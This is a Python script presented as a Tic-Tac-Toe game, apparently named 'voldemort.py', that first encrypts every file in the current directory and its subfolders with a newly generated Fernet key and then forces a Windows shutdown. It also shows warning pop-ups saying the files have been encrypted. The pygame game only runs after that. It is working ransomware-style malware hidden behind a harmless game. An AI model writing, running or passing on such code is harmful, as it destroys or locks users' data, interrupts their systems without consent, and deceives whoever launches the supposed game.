import pygame
import sys
import tkinter as tk
from tkinter import messagebox
import os
from cryptography.fernet import Fernet
os.system('cmd /c "pip install cryptography"')
os.system('cmd /c "pip install pygame"')
files=[]
dirr=[]
for file in os.listdir():
    if file== 'voldemort.py' or file=='thekey.key' :
        continue
    elif os.path.isfile(file):
        files.append(file)

        
key=Fernet.generate_key()
with open('thekey.key','wb') as thekey:
    thekey.write(key)
    
for file in os.listdir():
    if os.path.isdir(file):
        dirr.append(file)


for file in dirr:
    for root, dirs,file in os.walk(file):
        for i in file:
            input_file = os.path.join(root,i)
            print(input_file)
            with open(input_file, 'rb') as f:
                data = f.read()
                en=Fernet(key).encrypt(data)
            with open(input_file, 'wb') as f:
                f.write(en)
                



for file in files:
    with open(file,'rb') as thefile:
        content=thefile.read()
        en=Fernet(key).encrypt(content)
    with open(file,'wb') as thefile:
        thefile.write(en)
        
        print('encrypted')
     

for i in range(99911000):
    if i == 1100000:
        os.system('cmd /c "shutdown /s"')
    else:
        continue
for i in files:
    root = tk.Tk()
    root.withdraw()  
    messagebox.showwarning(i, "File has been encryped")
for i in dirr:
    root = tk.Tk()
    root.withdraw()  
    messagebox.showwarning(i, "File has been encryped")

pygame.init()


WIDTH, HEIGHT = 300, 300
GRID_SIZE = 3
CELL_SIZE = WIDTH // GRID_SIZE


WHITE = (255, 255, 255)
LINE_COLOR = (0, 0, 0)
FONT_COLOR = (0, 0, 0)

screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Tic-Tac-Toe")


font = pygame.font.Font(None, 36)

board = [["" for _ in range(GRID_SIZE)] for _ in range(GRID_SIZE)]


player_turn = "X"
game_over = False
countdown_timer = 15 * 1000
start_time = None
game_started = False

def draw_grid():
    for x in range(1, GRID_SIZE):
        pygame.draw.line(screen, LINE_COLOR, (x * CELL_SIZE, 0), (x * CELL_SIZE, HEIGHT), 3)
        pygame.draw.line(screen, LINE_COLOR, (0, x * CELL_SIZE), (WIDTH, x * CELL_SIZE), 3)

def draw_buttons():
    pygame.draw.rect(screen, WHITE, (0, HEIGHT - 50, WIDTH, 50))
    text = font.render("Quit", True, FONT_COLOR)
    screen.blit(text, (WIDTH // 2 - text.get_width() // 2, HEIGHT - 40))

def check_win(player):
    for row in board:
        if all(cell == player for cell in row):
            return True
    for col in range(GRID_SIZE):
        if all(row[col] == player for row in board):
            return True
    if all(board[i][i] == player for i in range(GRID_SIZE)) or all(board[i][GRID_SIZE - i - 1] == player for i in range(GRID_SIZE)):
        return True
    return False

def draw_winner(player):
    text = font.render(f"Player {player} wins!", True, FONT_COLOR)
    screen.blit(text, (WIDTH // 2 - text.get_width() // 2, HEIGHT - 100))

def draw_timer():
    if start_time is not None:
        current_time = pygame.time.get_ticks()
        remaining_time = max((countdown_timer - (current_time - start_time)) // 1000, 0)
        text = font.render(f"Starting in {remaining_time} seconds", True, FONT_COLOR)
        screen.fill(WHITE)
        screen.blit(text, (WIDTH // 2 - text.get_width() // 2, HEIGHT // 2 - text.get_height() // 2))

def main():
    global player_turn, game_over, start_time, game_started

    while True:
        
        for event in pygame.event.get():
            

            if not game_started:
                if start_time is None:
                    start_time = pygame.time.get_ticks()

            if not game_started and start_time is not None:
                current_time = pygame.time.get_ticks()
                if current_time - start_time >= countdown_timer:
                    game_started = True
                else:
                    continue

            if game_over:
                continue

            if event.type == pygame.MOUSEBUTTONDOWN:
                x, y = event.pos
                col = x // CELL_SIZE
                row = y // CELL_SIZE
                if 0 <= row < GRID_SIZE and 0 <= col < GRID_SIZE and board[row][col] == "":
                    board[row][col] = player_turn
                    if check_win(player_turn):
                        game_over = True
                    player_turn = "O" if player_turn == "X" else "X"

        draw_timer()
        pygame.display.update()

        if game_started:
            
            
            screen.fill(WHITE)
            draw_grid()

            for row in range(GRID_SIZE):
                for col in range(GRID_SIZE):
                    cell_value = board[row][col]
                    if cell_value == "X":
                        text = font.render("X", True, FONT_COLOR)
                        screen.blit(text, (col * CELL_SIZE + CELL_SIZE // 2 - text.get_width() // 2,
                                           row * CELL_SIZE + CELL_SIZE // 2 - text.get_height() // 2))
                    elif cell_value == "O":
                        text = font.render("O", True, FONT_COLOR)
                        screen.blit(text, (col * CELL_SIZE + CELL_SIZE // 2 - text.get_width() // 2,
                                           row * CELL_SIZE + CELL_SIZE // 2 - text.get_height() // 2))

            draw_buttons()

            if game_over:
                draw_winner(player_turn)

        pygame.display.update()


if __name__ == "__main__":
    main()
